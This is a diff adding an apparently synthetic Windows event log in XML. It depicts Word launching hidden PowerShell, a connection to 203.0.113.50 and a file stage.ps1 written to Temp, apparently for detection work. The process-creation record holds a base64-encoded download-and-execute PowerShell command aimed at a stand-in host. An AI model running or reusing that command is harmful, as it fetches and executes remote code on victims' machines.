@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="utf-8"?>
+<Events>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System><Provider Name="Microsoft-Windows-Security-Auditing"/><EventID>4624</EventID><TimeCreated SystemTime="2026-03-03T09:02:11Z"/><Computer>WS-12</Computer></System>
+    <EventData><Data Name="TargetUserName">jdoe</Data><Data Name="LogonType">2</Data></EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System><Provider Name="Microsoft-Windows-Security-Auditing"/><EventID>4688</EventID><TimeCreated SystemTime="2026-03-03T09:14:05Z"/><Computer>WS-12</Computer></System>
+    <EventData><Data Name="SubjectUserName">jdoe</Data><Data Name="NewProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name="ParentProcessName">C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</Data><Data Name="CommandLine">powershell.exe -NoProfile -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA1ADAALwBzAHQAYQBnAGUALgBwAHMAMQAnACkA</Data></EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System><Provider Name="Microsoft-Windows-Sysmon"/><EventID>3</EventID><TimeCreated SystemTime="2026-03-03T09:14:07Z"/><Computer>WS-12</Computer></System>
+    <EventData><Data Name="User">jdoe</Data><Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name="DestinationIp">203.0.113.50</Data><Data Name="DestinationPort">80</Data></EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System><Provider Name="Microsoft-Windows-Sysmon"/><EventID>11</EventID><TimeCreated SystemTime="2026-03-03T09:14:09Z"/><Computer>WS-12</Computer></System>
+    <EventData><Data Name="User">jdoe</Data><Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name="TargetFilename">C:\Users\jdoe\AppData\Local\Temp\stage.ps1</Data></EventData>
+  </Event>
+</Events>
